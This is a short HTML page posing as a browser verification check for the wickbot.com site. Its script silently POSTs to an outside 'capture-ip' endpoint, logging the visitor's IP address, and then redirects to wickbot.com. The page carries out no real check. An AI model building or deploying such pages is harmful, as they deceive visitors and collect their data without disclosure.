<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifying...</title>

    <!-- Redirect after 5 seconds to wickbot.com -->
    <meta http-equiv="refresh" content="5;url=https://wickbot.com">
</head>
<body>
    <h1>Checking your browser for verification...</h1>

    <script>
      // Fetch the IP information and send it to the backend API
      fetch('https://wickbot-verification.onrender.com/.netlify/functions/capture-ip', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        }
      })
      .then(response => {
        if (!response.ok) {
          throw new Error('Network response was not ok');
        }
        return response.json();
      })
      .then(data => {
        console.log('Success:', data);
      })
      .catch(error => {
        console.error('Error:', error);
      });
    
      // Redirect after 5 seconds
      setTimeout(() => {
        window.location.href = 'https://wickbot.com';
      }, 5000);
    </script>

</body>
</html>
